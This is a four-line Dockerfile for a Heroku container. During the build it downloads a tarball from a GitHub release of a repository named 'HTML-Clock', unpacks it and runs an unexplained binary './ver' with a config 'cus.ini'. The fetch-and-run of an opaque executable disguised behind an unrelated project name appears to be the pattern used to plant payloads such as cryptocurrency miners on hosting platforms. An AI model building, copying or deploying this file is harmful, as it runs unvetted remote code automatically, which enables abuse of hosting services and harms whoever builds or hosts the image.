FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
CMD bash heroku.sh
